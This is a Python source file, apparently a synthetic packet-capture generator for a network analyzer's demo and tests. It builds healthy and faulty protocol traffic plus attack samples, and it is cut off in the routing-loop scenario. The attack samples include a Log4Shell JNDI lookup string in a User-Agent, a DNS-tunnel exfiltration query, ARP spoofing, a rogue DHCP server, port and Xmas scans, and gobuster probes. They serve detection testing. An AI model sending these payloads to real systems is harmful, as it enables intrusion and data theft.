"""Synthetic capture generator.

Builds a realistic multi-scenario pcapng that exercises every analyzer: healthy
and broken TCP sessions, DNS, DHCP, HTTP, TLS, BGP, OSPF, EIGRP, RIP, ICMP,
ARP, STP and attack traffic. Used for the ``demo`` command and the test-suite.
"""
from __future__ import annotations

import ipaddress
import struct

from .reader import write_pcap, write_pcapng

T0 = 1_700_000_000.0
BCAST = "ff:ff:ff:ff:ff:ff"


def _mac(s: str) -> bytes:
    return bytes(int(x, 16) for x in s.split(":"))


def _ip(s: str) -> bytes:
    return ipaddress.IPv4Address(s).packed


def _cks(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack(f"!{len(data) // 2}H", data))
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF


class Gen:
    def __init__(self):
        self.frames: list[tuple[float, bytes]] = []
        self._ipid = 1000

    # ------------------------------------------------------------ builders --
    def eth(self, t, src, dst, etype, payload, vlan=None):
        hdr = _mac(dst) + _mac(src)
        if vlan is not None:
            hdr += struct.pack("!HH", 0x8100, vlan)
        self.frames.append((T0 + t, hdr + struct.pack("!H", etype) + payload))

    def ipv4(self, t, smac, dmac, src, dst, proto, payload, ttl=64, df=True, ident=None):
        self._ipid = (self._ipid + 1) & 0xFFFF
        hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(payload), ident if ident is not None else self._ipid,
                          0x4000 if df else 0, ttl, proto, 0, _ip(src), _ip(dst))
        hdr = hdr[:10] + struct.pack("!H", _cks(hdr)) + hdr[12:]
        self.eth(t, smac, dmac, 0x0800, hdr + payload)

    def udp(self, t, smac, dmac, src, dst, sport, dport, payload, ttl=64):
        self.ipv4(t, smac, dmac, src, dst, 17, struct.pack("!HHHH", sport, dport, 8 + len(payload), 0) + payload, ttl=ttl)

    def tcp_raw(self, t, smac, dmac, src, dst, sport, dport, seq, ack, flags, win, payload=b"", opts=b"", ttl=64):
        opts += b"\x00" * ((4 - len(opts) % 4) % 4)
        off = (20 + len(opts)) // 4
        hdr = struct.pack("!HHIIBBHHH", sport, dport, seq & 0xFFFFFFFF, ack & 0xFFFFFFFF, off << 4, flags, win, 0, 0)
        self.ipv4(t, smac, dmac, src, dst, 6, hdr + opts + payload, ttl=ttl)

    def icmp(self, t, smac, dmac, src, dst, typ, code, rest=b"\x00\x00\x00\x00", body=b"", ttl=255):
        msg = struct.pack("!BBH", typ, code, 0) + rest + body
        msg = msg[:2] + struct.pack("!H", _cks(msg)) + msg[4:]
        self.ipv4(t, smac, dmac, src, dst, 1, msg, ttl=ttl, df=False)

    def arp(self, t, smac, sip, tmac, tip, op=1, dmac=BCAST):
        body = struct.pack("!HHBBH", 1, 0x0800, 6, 4, op) + _mac(smac) + _ip(sip) + _mac(tmac) + _ip(tip)
        self.eth(t, smac, dmac, 0x0806, body)

    def save(self, path, fmt="pcapng", keylog: str | None = None):
        frames = sorted(self.frames, key=lambda x: x[0])
        if fmt == "pcapng":
            write_pcapng(path, frames, keylog=keylog)
        else:
            write_pcap(path, frames)
        return len(frames)


def tcp_opts(mss=1460, ws=7, sack=True, ts=False):
    o = struct.pack("!BBH", 2, 4, mss)
    if sack:
        o += b"\x04\x02"
    if ws is not None:
        o += b"\x01\x03\x03" + bytes([ws])
    return o


class Conv:
    """Stateful TCP conversation helper (client c, server s)."""

    def __init__(self, g, cmac, smac, cip, sip, cport, sport, isn_c=1000, isn_s=5000, ws=7, ttl_c=64, ttl_s=64,
                 mss_c=1460, mss_s=1460, sack=True):
        self.g, self.cmac, self.smac, self.cip, self.sip = g, cmac, smac, cip, sip
        self.cport, self.sport, self.ws, self.ttl_c, self.ttl_s = cport, sport, ws, ttl_c, ttl_s
        self.cseq, self.sseq = isn_c, isn_s
        self.mss_c, self.mss_s, self.sack = mss_c, mss_s, sack
        self.win = 65535 >> ws if ws else 65535

    def c(self, t, flags, payload=b"", seq=None, ack=None, win=None, opts=b"", capture=True):
        s = self.cseq if seq is None else seq
        if capture:
            self.g.tcp_raw(t, self.cmac, self.smac, self.cip, self.sip, self.cport, self.sport, s,
                           self.sseq if ack is None else ack, flags, self.win if win is None else win, payload, opts, self.ttl_c)
        if seq is None:
            self.cseq += len(payload) + (1 if flags & 0x03 else 0)

    def s(self, t, flags, payload=b"", seq=None, ack=None, win=None, opts=b"", capture=True, ttl=None):
        s = self.sseq if seq is None else seq
        if capture:
            self.g.tcp_raw(t, self.smac, self.cmac, self.sip, self.cip, self.sport, self.cport, s,
                           self.cseq if ack is None else ack, flags, self.win if win is None else win, payload, opts,
                           ttl or self.ttl_s)
        if seq is None:
            self.sseq += len(payload) + (1 if flags & 0x03 else 0)

    def handshake(self, t, rtt_s=0.02, rtt_c=0.0005):
        self.c(t, 0x02, win=64240, opts=tcp_opts(self.mss_c, self.ws, self.sack))
        self.s(t + rtt_s, 0x12, win=65160, opts=tcp_opts(self.mss_s, self.ws, self.sack))
        self.c(t + rtt_s + rtt_c, 0x10)
        return t + rtt_s + rtt_c

    def close(self, t):
        self.c(t, 0x11)
        self.s(t + 0.01, 0x11)
        self.c(t + 0.0105, 0x10)


# --------------------------------------------------------------- payloads ---
def dns_msg(tid, name, qtype=1, response=False, rcode=0, answers=(), tc=False):
    flags = 0x0100
    if response:
        flags |= 0x8080 | rcode | (0x0200 if tc else 0)
    q = b"".join(bytes([len(l)]) + l.encode() for l in name.split(".")) + b"\x00" + struct.pack("!HH", qtype, 1)
    an = b""
    for a in answers:
        an += b"\xc0\x0c" + struct.pack("!HHIH", 1, 1, 300, 4) + _ip(a)
    return struct.pack("!HHHHHH", tid, flags, 1, len(answers) if response else 0, 0, 0) + q + an


def dhcp_msg(op, xid, mac, mtype, yiaddr="0.0.0.0", server=None, router=None, dns=None, giaddr="0.0.0.0", msg=None):
    b = struct.pack("!BBBBIHH", op, 1, 6, 0, xid, 0, 0x8000) + _ip("0.0.0.0") + _ip(yiaddr) + _ip("0.0.0.0") + _ip(giaddr)
    b += _mac(mac) + b"\x00" * 10 + b"\x00" * 192 + b"\x63\x82\x53\x63"
    b += bytes([53, 1, mtype])
    if server:
        b += bytes([54, 4]) + _ip(server)
    if router:
        b += bytes([3, 4]) + _ip(router) + bytes([1, 4]) + _ip("255.255.255.0") + bytes([51, 4]) + struct.pack("!I", 86400)
    if dns:
        b += bytes([6, 4]) + _ip(dns)
    if msg:
        b += bytes([56, len(msg)]) + msg.encode()
    return b + b"\xff"


def client_hello(sni, version=0x0303, ciphers=(0x1301, 0xC02F, 0xC030), sup_versions=None, random=b"\x11" * 32):
    ext = b""
    if sni:
        sn = sni.encode()
        ext += struct.pack("!HHHBH", 0, len(sn) + 5, len(sn) + 3, 0, len(sn)) + sn
    ext += struct.pack("!HHH", 10, 4, 2) + struct.pack("!H", 29)
    ext += struct.pack("!HHB", 11, 2, 1) + b"\x00"
    if sup_versions:
        ext += struct.pack("!HHB", 43, 1 + 2 * len(sup_versions), 2 * len(sup_versions)) + b"".join(struct.pack("!H", v) for v in sup_versions)
    body = struct.pack("!H", version) + random + b"\x00" + struct.pack("!H", 2 * len(ciphers)) + \
        b"".join(struct.pack("!H", c) for c in ciphers) + b"\x01\x00" + struct.pack("!H", len(ext)) + ext
    hs = b"\x01" + len(body).to_bytes(3, "big") + body
    return struct.pack("!BHH", 22, 0x0301, len(hs)) + hs


def server_hello(version=0x0303, cipher=0xC02F, tls13=False, random=b"\x22" * 32):
    ext = struct.pack("!HHH", 43, 2, 0x0304) if tls13 else b""
    body = struct.pack("!H", version) + random + b"\x00" + struct.pack("!HB", cipher, 0) + struct.pack("!H", len(ext)) + ext
    hs = b"\x02" + len(body).to_bytes(3, "big") + body
    return struct.pack("!BHH", 22, version, len(hs)) + hs


def tls_alert(desc, version=0x0303):
    return struct.pack("!BHHBB", 21, version, 2, 2, desc)


def bgp(mtype, body=b""):
    return b"\xff" * 16 + struct.pack("!HB", 19 + len(body), mtype) + body


def bgp_open(asn, hold, rid):
    return bgp(1, struct.pack("!BHH4sB", 4, asn, hold, _ip(rid), 0))


def bgp_update(nlri=(), withdrawn=(), as_path=(), next_hop=None):
    def pfx(lst):
        out = b""
        for p in lst:
            n = ipaddress.IPv4Network(p)
            nb = (n.prefixlen + 7) // 8
            out += bytes([n.prefixlen]) + n.network_address.packed[:nb]
        return out
    w = pfx(withdrawn)
    attrs = b""
    if nlri:
        attrs += b"\x40\x01\x01\x00"
        seg = b"\x02" + bytes([len(as_path)]) + b"".join(struct.pack("!H", a) for a in as_path)
        attrs += b"\x40\x02" + bytes([len(seg)]) + seg
        attrs += b"\x40\x03\x04" + _ip(next_hop)
    return bgp(2, struct.pack("!H", len(w)) + w + struct.pack("!H", len(attrs)) + attrs + pfx(nlri))


def bgp_notification(code, sub):
    return bgp(3, bytes([code, sub]))


def ospf_hello(rid, area, mask, hello, dead, neighbors=(), auth=0):
    body = struct.pack("!4sHBBI4s4s", _ip(mask), hello, 0x02, 1, dead, _ip("0.0.0.0"), _ip("0.0.0.0"))
    body += b"".join(_ip(n) for n in neighbors)
    return _ospf_hdr(1, rid, area, body, auth)


def ospf_dbd(rid, area, mtu, flags, seq):
    return _ospf_hdr(2, rid, area, struct.pack("!HBBI", mtu, 0x02, flags, seq))


def _ospf_hdr(ptype, rid, area, body, auth=0):
    return struct.pack("!BBH4s4sHH", 2, ptype, 24 + len(body), _ip(rid), _ip(area), 0, auth) + b"\x00" * 8 + body


def eigrp(opcode, asn, seq=0, ack=0, k=(1, 0, 1, 0, 0), hold=15, routes=(), auth=False, goodbye=False):
    tlvs = b""
    if opcode == 5:
        kk = (255,) * 5 if goodbye else k
        tlvs += struct.pack("!HH", 1, 12) + bytes(kk) + b"\x00" + struct.pack("!H", hold)
        tlvs += struct.pack("!HH", 4, 8) + bytes([15, 0, 2, 0])
    if auth:
        tlvs += struct.pack("!HH", 2, 8) + b"\x00" * 4
    for prefix, delay in routes:
        n = ipaddress.IPv4Network(prefix)
        nb = (n.prefixlen + 7) // 8
        v = _ip("0.0.0.0") + struct.pack("!II", delay, 256) + b"\x00\x05\xdc" + bytes([1, 255, 1, 0, 0, n.prefixlen]) + n.network_address.packed[:nb]
        tlvs += struct.pack("!HH", 0x0102, 4 + len(v)) + v
    return struct.pack("!BBHIIIHH", 2, opcode, 0, 0, seq, ack, 0, asn) + tlvs


def rip(version, routes):
    b = struct.pack("!BBH", 2, version, 0)
    for net, mask, metric in routes:
        b += struct.pack("!HH", 2, 0) + _ip(net) + _ip(mask if version == 2 else "0.0.0.0") + _ip("0.0.0.0") + struct.pack("!I", metric)
    return b


def http_req(method, host, uri, ua="Mozilla/5.0 (Windows NT 10.0) Chrome/120", version="HTTP/1.1", extra=""):
    ua_line = f"User-Agent: {ua}\r\n" if ua else ""
    return f"{method} {uri} {version}\r\nHost: {host}\r\n{ua_line}{extra}Accept: */*\r\n\r\n".encode()


def http_resp(code, reason, body=b"", ctype="text/html"):
    return f"HTTP/1.1 {code} {reason}\r\nContent-Type: {ctype}\r\nContent-Length: {len(body)}\r\n\r\n".encode() + body


# ------------------------------------------------------------- scenarios ----
GW_MAC = "00:00:0c:9f:f0:01"
FW = "10.0.0.1"


def build_demo() -> Gen:
    g = Gen()
    cm = lambda n: f"00:50:56:00:01:{n:02x}"  # noqa: E731  client MACs
    sm = lambda n: f"00:50:56:00:02:{n:02x}"  # noqa: E731  server MACs

    # 1. healthy web session with DNS ----------------------------------------
    g.udp(0.000, cm(10), GW_MAC, "10.0.1.10", "10.0.0.53", 53001, 53, dns_msg(0x1001, "www.example.com"))
    g.udp(0.012, GW_MAC, cm(10), "10.0.0.53", "10.0.1.10", 53, 53001, dns_msg(0x1001, "www.example.com", response=True, answers=["10.0.2.20"]), ttl=63)
    c = Conv(g, cm(10), GW_MAC, "10.0.1.10", "10.0.2.20", 50001, 80, ttl_s=63)
    t = c.handshake(0.020, rtt_s=0.004)
    c.c(t + 0.001, 0x18, http_req("GET", "www.example.com", "/index.html"))
    c.s(t + 0.030, 0x18, http_resp(200, "OK", b"<html>hello</html>"))
    c.c(t + 0.031, 0x10)
    c.close(t + 0.2)

    # 2. slow application (server think time 3.2 s, no loss) ------------------
    c = Conv(g, cm(10), GW_MAC, "10.0.1.10", "10.0.2.30", 50002, 80, ttl_s=63)
    t = c.handshake(1.0, rtt_s=0.003)
    c.c(t + 0.001, 0x18, http_req("GET", "reports.example.com", "/api/report?year=2025"))
    c.s(t + 0.004, 0x10)
    c.s(t + 3.204, 0x18, http_resp(200, "OK", b"{\"rows\": 12000}", "application/json"))
    c.c(t + 3.205, 0x10)
    c.c(t + 3.300, 0x18, http_req("POST", "reports.example.com", "/api/save"))
    c.s(t + 3.310, 0x18, http_resp(500, "Internal Server Error", b"NullReferenceException"))
    c.c(t + 3.311, 0x10)
    c.close(t + 3.5)

    # 3. lossy download: lost segment, dup ACKs, fast retransmit, RTO ---------
    c = Conv(g, cm(11), GW_MAC, "10.0.1.11", "198.51.100.7", 50003, 80, ttl_s=52)
    t = c.handshake(6.0, rtt_s=0.045)
    c.c(t + 0.001, 0x18, http_req("GET", "downloads.example.net", "/files/tool.zip"))
    base = t + 0.05
    seg = b"Z" * 1448
    c.s(base, 0x10, http_resp(200, "OK", b"", "application/zip") + seg[:1300])
    lost_seq = c.sseq
    c.s(base + 0.0001, 0x10, seg, capture=False)            # lost after the server, never seen here
    c.s(base + 0.0002, 0x10, seg)
    c.c(base + 0.046, 0x10, ack=lost_seq)
    c.s(base + 0.0003, 0x10, seg)
    c.c(base + 0.0465, 0x10, ack=lost_seq)
    c.c(base + 0.0470, 0x10, ack=lost_seq)
    c.s(base + 0.0920, 0x10, seg, seq=lost_seq)              # fast retransmission
    c.c(base + 0.138, 0x10)
    rto_seq = c.sseq
    c.s(base + 0.14, 0x18, seg)                              # lost -> RTO
    c.s(base + 1.40, 0x18, seg, seq=rto_seq)                 # retransmission after 1.26 s
    c.c(base + 1.446, 0x10)
    c.close(base + 1.6)

    # 4. receiver bottleneck: server advertises zero window ------------------
    c = Conv(g, cm(12), sm(40), "10.0.1.12", "10.0.2.40", 50004, 445, ttl_s=128)
    t = c.handshake(9.0, rtt_s=0.0008)
    for i in range(4):
        c.c(t + 0.001 * (i + 1), 0x10, b"U" * 1448)
    c.s(t + 0.006, 0x10, win=40)
    c.c(t + 0.007, 0x10, b"U" * 1448)
    c.s(t + 0.008, 0x10, win=0)                               # zero window
    c.c(t + 0.300, 0x10, b"U", win=None)                       # zero-window probe
    c.cseq -= 1
    c.s(t + 0.301, 0x10, win=0)
    c.c(t + 1.500, 0x10, b"U")
    c.cseq -= 1
    c.s(t + 1.501, 0x10, win=0)
    c.s(t + 2.600, 0x10, win=200)                             # window update
    c.c(t + 2.601, 0x18, b"U" * 1448)
    c.s(t + 2.602, 0x10)
    c.close(t + 2.7)

    # 5. firewall block: SYN + ICMP admin prohibited + SYN retries ----------
    c = Conv(g, cm(13), GW_MAC, "10.0.1.13", "10.0.3.5", 50005, 3389)
    for i, dt in enumerate((0.0, 1.0, 3.0)):
        c.c(12.0 + dt, 0x02, win=64240, opts=tcp_opts(), seq=1000)
        orig = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 52, 1, 0x4000, 63, 6, 0, _ip("10.0.1.13"), _ip("10.0.3.5")) + struct.pack("!HHI", 50005, 3389, 1000)
        g.icmp(12.001 + dt, GW_MAC, cm(13), FW, "10.0.1.13", 3, 13, body=orig)
    # 6. connection refused -----------------------------------------------------
    c = Conv(g, cm(13), GW_MAC, "10.0.1.13", "10.0.2.20", 50006, 8443, ttl_s=63)
    c.c(16.0, 0x02, win=64240, opts=tcp_opts())
    c.s(16.002, 0x14, seq=0)

    # 7. DNS failures ---------------------------------------------------------
    g.udp(17.0, cm(14), GW_MAC, "10.0.1.14", "10.0.0.53", 53100, 53, dns_msg(0x2001, "intranet.corp.local"))
    g.udp(17.4, GW_MAC, cm(14), "10.0.0.53", "10.0.1.14", 53, 53100, dns_msg(0x2001, "intranet.corp.local", response=True, rcode=2), ttl=63)
    for i in range(3):
        g.udp(18.0 + i * 1.0, cm(14), GW_MAC, "10.0.1.14", "10.0.0.53", 53101, 53, dns_msg(0x2002, "api.partner.com"))
    g.udp(21.0, cm(14), GW_MAC, "10.0.1.14", "10.0.0.53", 53102, 53, dns_msg(0x2003, "wwww.exmaple.com"))
    g.udp(21.02, GW_MAC, cm(14), "10.0.0.53", "10.0.1.14", 53, 53102, dns_msg(0x2003, "wwww.exmaple.com", response=True, rcode=3), ttl=63)
    g.udp(21.5, cm(14), GW_MAC, "10.0.1.14", "10.0.0.53", 53103, 53, dns_msg(0x2004, "cdn.example.org"))
    g.udp(21.95, GW_MAC, cm(14), "10.0.0.53", "10.0.1.14", 53, 53103, dns_msg(0x2004, "cdn.example.org", response=True, answers=["203.0.113.80"]), ttl=63)
    tun = "aGVsbG8gd29ybGQgdGhpcyBpcyBleGZpbHRyYXRlZA.x7f3k9q2m1z8.tunnel-c2.example"
    g.udp(22.0, cm(15), GW_MAC, "10.0.1.15", "8.8.8.8", 53200, 53, dns_msg(0x3001, tun, qtype=16))
    g.udp(22.03, GW_MAC, cm(15), "8.8.8.8", "10.0.1.15", 53, 53200, dns_msg(0x3001, tun, qtype=16, response=True, rcode=3), ttl=118)

    # 8. DHCP: no offer (→ APIPA), rogue server, NAK --------------------------
    for i in range(3):
        g.udp(23.0 + i * 2, cm(0x31), BCAST, "0.0.0.0", "255.255.255.255", 68, 67, dhcp_msg(1, 0xAA000001, cm(0x31), 1))
    g.arp(29.0, cm(0x31), "169.254.12.7", "00:00:00:00:00:00", "169.254.12.7")
    g.udp(29.5, cm(0x31), BCAST, "169.254.12.7", "169.254.255.255", 137, 137, b"\x00" * 50)
    g.udp(30.0, cm(0x32), BCAST, "0.0.0.0", "255.255.255.255", 68, 67, dhcp_msg(1, 0xBB000002, cm(0x32), 1))
    g.udp(30.01, "00:50:56:00:00:02", cm(0x32), "10.0.0.2", "10.0.1.50", 67, 68,
          dhcp_msg(2, 0xBB000002, cm(0x32), 2, "10.0.1.50", "10.0.0.2", FW, "10.0.0.53"))
    g.udp(30.005, "de:ad:be:ef:00:66", cm(0x32), "10.0.0.66", "10.0.1.200", 67, 68,
          dhcp_msg(2, 0xBB000002, cm(0x32), 2, "10.0.1.200", "10.0.0.66", "10.0.0.66", "10.0.0.66"))
    g.udp(30.02, cm(0x32), BCAST, "0.0.0.0", "255.255.255.255", 68, 67, dhcp_msg(1, 0xBB000002, cm(0x32), 3, server="10.0.0.66"))
    g.udp(30.03, "de:ad:be:ef:00:66", cm(0x32), "10.0.0.66", "10.0.1.200", 67, 68,
          dhcp_msg(2, 0xBB000002, cm(0x32), 5, "10.0.1.200", "10.0.0.66", "10.0.0.66", "10.0.0.66"))
    g.udp(31.0, cm(0x33), BCAST, "0.0.0.0", "255.255.255.255", 68, 67, dhcp_msg(1, 0xCC000003, cm(0x33), 3))
    g.udp(31.01, "00:50:56:00:00:02", cm(0x33), "10.0.0.2", "255.255.255.255", 67, 68,
          dhcp_msg(2, 0xCC000003, cm(0x33), 6, server="10.0.0.2", msg="requested address not on this subnet"))

    # 9. ARP spoofing of the gateway ---------------------------------------
    g.arp(32.0, GW_MAC, FW, cm(10), "10.0.1.10", op=2, dmac=cm(10))
    for i in range(3):
        g.arp(32.5 + i, "de:ad:be:ef:00:66", FW, cm(10), "10.0.1.10", op=2, dmac=cm(10))
    g.arp(34.0, cm(10), "10.0.1.10", "00:00:00:00:00:00", "10.0.1.99")
    g.arp(35.0, cm(10), "10.0.1.10", "00:00:00:00:00:00", "10.0.1.99")

    # 10. TLS: legacy TLS 1.0 + RC4, unknown_ca alert, handshake reset -------
    c = Conv(g, cm(16), GW_MAC, "10.0.1.16", "203.0.113.10", 50010, 443, ttl_s=50)
    t = c.handshake(36.0, rtt_s=0.030)
    c.c(t + 0.001, 0x18, client_hello("legacy.example.com", 0x0301, (0x0005, 0x000A, 0x002F)))
    c.s(t + 0.032, 0x18, server_hello(0x0301, 0x0005))
    c.close(t + 0.2)
    c = Conv(g, cm(16), GW_MAC, "10.0.1.16", "203.0.113.11", 50011, 443, ttl_s=50)
    t = c.handshake(37.0, rtt_s=0.030)
    c.c(t + 0.001, 0x18, client_hello("portal.example.com", 0x0303, sup_versions=[0x0304, 0x0303]))
    c.s(t + 0.031, 0x18, server_hello(0x0303, 0xC02F))
    c.c(t + 0.033, 0x18, tls_alert(48))
    c.c(t + 0.034, 0x14)
    c.cseq += 0
    c = Conv(g, cm(16), GW_MAC, "10.0.1.16", "203.0.113.12", 50012, 443, ttl_s=50)
    t = c.handshake(38.0, rtt_s=0.030)
    c.c(t + 0.001, 0x18, client_hello("blocked-site.example", 0x0303))
    c.s(t + 0.003, 0x14, ttl=62)                              # RST injected by NGFW (TTL differs)

    # 11. HTTP: basic auth, HTTP/1.0, gobuster scan ---------------------------
    c = Conv(g, cm(17), GW_MAC, "10.0.1.17", "10.0.2.20", 50013, 80, ttl_s=63)
    t = c.handshake(40.0, rtt_s=0.002)
    c.c(t + 0.001, 0x18, http_req("GET", "intranet.example.com", "/admin/login?user=admin&password=Winter2025", version="HTTP/1.0",
                                   extra="Authorization: Basic YWRtaW46V2ludGVyMjAyNQ==\r\n"))
    c.s(t + 0.010, 0x18, http_resp(200, "OK", b"welcome"))
    c.close(t + 0.1)

    # 12. port scan + gobuster from 10.0.9.9 ---------------------------------
    sc = "00:50:56:00:09:09"
    for i, port in enumerate(range(20, 60)):
        tt = 42.0 + i * 0.002
        g.tcp_raw(tt, sc, GW_MAC, "10.0.9.9", "10.0.2.20", 40000 + i, port, 7777, 0, 0x02, 1024, ttl=45)
        if port in (22, 53):
            g.tcp_raw(tt + 0.0005, GW_MAC, sc, "10.0.2.20", "10.0.9.9", port, 40000 + i, 9000, 7778, 0x12, 65160, opts=tcp_opts(), ttl=63)
            g.tcp_raw(tt + 0.0007, sc, GW_MAC, "10.0.9.9", "10.0.2.20", 40000 + i, port, 7778, 0, 0x04, 0, ttl=45)
        else:
            g.tcp_raw(tt + 0.0005, GW_MAC, sc, "10.0.2.20", "10.0.9.9", port, 40000 + i, 0, 7778, 0x14, 0, ttl=63)
    g.tcp_raw(42.5, sc, GW_MAC, "10.0.9.9", "10.0.2.20", 41000, 80, 1, 0, 0x29, 1024, ttl=45)   # Xmas
    c = Conv(g, sc, GW_MAC, "10.0.9.9", "10.0.2.20", 41001, 80, ttl_c=45, ttl_s=63)
    t = c.handshake(43.0, rtt_s=0.002)
    for i, path in enumerate(["/admin", "/backup", "/.git/config", "/wp-login.php", "/shell.php"]):
        c.c(t + 0.01 * i, 0x18, http_req("GET", "10.0.2.20", path, ua="gobuster/3.6"))
        c.s(t + 0.01 * i + 0.002, 0x18, http_resp(404, "Not Found"))
    c.c(t + 0.1, 0x18, http_req("GET", "10.0.2.20", "/", ua="${jndi:ldap://10.0.9.9:1389/a}"))
    c.s(t + 0.102, 0x18, http_resp(200, "OK", b"ok"))
    c.close(t + 0.2)

    # 13. PMTUD: ICMP frag needed + full-size retransmissions ----------------
    c = Conv(g, cm(18), GW_MAC, "10.0.1.18", "10.0.2.50", 50014, 80, ttl_s=62)
    t = c.handshake(45.0, rtt_s=0.010)
    c.c(t + 0.001, 0x18, http_req("GET", "files.example.com", "/large/report.pdf"))
    s0 = c.sseq
    c.s(t + 0.012, 0x10, b"P" * 1460, capture=False)
    orig = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 1500, 1, 0x4000, 63, 6, 0, _ip("10.0.2.50"), _ip("10.0.1.18")) + struct.pack("!HHI", 80, 50014, s0)
    g.icmp(t + 0.013, "00:00:0c:00:fe:fe", "00:50:56:00:02:50", "10.0.0.254", "10.0.2.50", 3, 4, rest=struct.pack("!HH", 0, 1400), body=orig)
    c.s(t + 0.300, 0x10, b"P" * 1460, seq=s0)
    c.s(t + 0.900, 0x10, b"P" * 1460, seq=s0)
    c.c(t + 0.950, 0x10)

    # 14. BGP: established session, loss, Hold Timer Expired, withdrawals ----
    r1m, r2m, r9m, r13m = "00:00:0c:01:00:01", "00:00:0c:01:00:02", "00:00:0c:01:00:09", "00:00:0c:01:00:13"
    b = Conv(g, r2m, r1m, "192.0.2.2", "192.0.2.1", 179, 179, ttl_c=1, ttl_s=1, isn_c=10, isn_s=90000)
    b.cport = 51000
    t = b.handshake(50.0, rtt_s=0.001)
    b.c(t + 0.001, 0x18, bgp_open(65002, 9, "2.2.2.2"))
    b.s(t + 0.002, 0x18, bgp_open(65001, 9, "1.1.1.1"))
    b.c(t + 0.003, 0x18, bgp(4))
    b.s(t + 0.004, 0x18, bgp(4))
    b.s(t + 0.010, 0x18, bgp_update(["172.20.0.0/16", "172.21.0.0/16", "172.22.5.0/24"], as_path=[65001, 64900], next_hop="192.0.2.1"))
    b.c(t + 0.011, 0x10)
    ka = b.cseq
    b.c(t + 3.0, 0x18, bgp(4))
    b.c(t + 4.2, 0x18, bgp(4), seq=ka)
    b.c(t + 6.6, 0x18, bgp(4), seq=ka)
    b.s(t + 9.1, 0x18, bgp_notification(4, 0))
    b.s(t + 9.2, 0x14)
    hold_t = t + 9.1
    w = Conv(g, r9m, r1m, "192.0.2.9", "192.0.2.1", 179, 179, ttl_c=1, ttl_s=1, isn_c=20, isn_s=80000)
    w.cport = 51009
    tw = w.handshake(49.0, rtt_s=0.001)
    w.c(tw + 0.001, 0x18, bgp_open(65009, 90, "9.9.9.9"))
    w.s(tw + 0.002, 0x18, bgp_open(65001, 90, "1.1.1.1"))
    w.c(tw + 0.003, 0x18, bgp(4))
    w.s(tw + 0.004, 0x18, bgp(4))
    w.s(hold_t + 0.05, 0x18, bgp_update(withdrawn=["172.20.0.0/16", "172.21.0.0/16", "172.22.5.0/24"]))
    w.c(hold_t + 0.06, 0x10)
    for i in range(3):
        orig = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 60, 1, 0x4000, 63, 6, 0, _ip("10.0.1.19"), _ip("172.20.5.10")) + struct.pack("!HHI", 50100 + i, 443, 1)
        g.icmp(hold_t + 0.5 + i, r1m, GW_MAC, "192.0.2.1", "10.0.1.19", 3, 0, body=orig)
    x = Conv(g, r13m, r1m, "192.0.2.13", "192.0.2.1", 179, 179, ttl_c=1, ttl_s=1)
    x.cport = 51013
    tx = x.handshake(48.0, rtt_s=0.001)
    x.c(tx + 0.001, 0x18, bgp_open(65113, 180, "13.13.13.13"))
    x.s(tx + 0.002, 0x18, bgp_notification(2, 2))
    x.s(tx + 0.003, 0x14)

    # 15. OSPF: MTU mismatch / EXSTART stuck, hello mismatch --------------------
    om = lambda n: f"00:00:0c:0f:00:{n:02x}"  # noqa: E731
    for i in range(6):
        tt = 60.0 + i * 10
        g.ipv4(tt, om(1), "01:00:5e:00:00:05", "10.10.10.1", "224.0.0.5", 89,
               ospf_hello("1.1.1.1", "0.0.0.0", "255.255.255.0", 10, 40, ["2.2.2.2"]), ttl=1)
        g.ipv4(tt + 0.5, om(2), "01:00:5e:00:00:05", "10.10.10.2", "224.0.0.5", 89,
               ospf_hello("2.2.2.2", "0.0.0.0", "255.255.255.0", 10, 40, ["1.1.1.1"]), ttl=1)
        g.ipv4(tt + 1, om(1), om(2), "10.10.10.1", "10.10.10.2", 89, ospf_dbd("1.1.1.1", "0.0.0.0", 1500, 7, 5000), ttl=1)
        g.ipv4(tt + 1.2, om(2), om(1), "10.10.10.2", "10.10.10.1", 89, ospf_dbd("2.2.2.2", "0.0.0.0", 1400, 7, 7000), ttl=1)
        g.ipv4(tt + 2, om(3), "01:00:5e:00:00:05", "10.10.20.3", "224.0.0.5", 89,
               ospf_hello("3.3.3.3", "0.0.0.1", "255.255.255.0", 5, 20), ttl=1)
        g.ipv4(tt + 2.5, om(4), "01:00:5e:00:00:05", "10.10.20.4", "224.0.0.5", 89,
               ospf_hello("4.4.4.4", "0.0.0.1", "255.255.255.0", 10, 40), ttl=1)

    # 16. EIGRP: K mismatch, queries, SIA, retransmissions, goodbye -------------
    em = lambda n: f"00:00:0c:0e:00:{n:02x}"  # noqa: E731
    for i in range(3):
        tt = 120.0 + i * 5
        g.ipv4(tt, em(1), "01:00:5e:00:00:0a", "10.20.0.1", "224.0.0.10", 88, eigrp(5, 100, k=(1, 0, 1, 0, 0)), ttl=2)
        g.ipv4(tt + 0.3, em(2), "01:00:5e:00:00:0a", "10.20.0.2", "224.0.0.10", 88, eigrp(5, 100, k=(1, 1, 1, 0, 0)), ttl=2)
    for i in range(4):
        g.ipv4(136.0 + i * 0.2, em(3), em(4), "10.20.1.1", "10.20.1.2", 88,
               eigrp(3, 200, seq=40 + i, routes=[("10.99.%d.0/24" % i, 0xFFFFFFFF)]), ttl=2)
    for i in range(3):
        g.ipv4(137.0 + i * 5, em(3), em(4), "10.20.1.1", "10.20.1.2", 88, eigrp(1, 200, seq=55), ttl=2)
    g.ipv4(150.0, em(3), em(4), "10.20.1.1", "10.20.1.2", 88, eigrp(10, 200, seq=60), ttl=2)
    g.ipv4(155.0, em(4), "01:00:5e:00:00:0a", "10.20.1.2", "224.0.0.10", 88, eigrp(5, 200, goodbye=True), ttl=2)

    # 17. RIP: v1/v2 mismatch, poisoned routes ------------------------------
    for i in range(3):
        g.udp(160.0 + i * 30, "00:00:0c:0a:00:01", "01:00:5e:00:00:09", "10.30.0.1", "224.0.0.9", 520, 520,
              rip(2, [("10.31.0.0", "255.255.0.0", 1), ("10.32.0.0", "255.255.0.0", 2)]), ttl=1)
        g.udp(161.0 + i * 30, "00:00:0c:0a:00:02", BCAST, "10.30.0.2", "10.30.0.255", 520, 520,
              rip(1, [("10.33.0.0", "0.0.0.0", 16 if i else 3)]), ttl=1)

    # 18. routing loop: TTL exceeded from two routers for same destination -----
    for i in range(4):
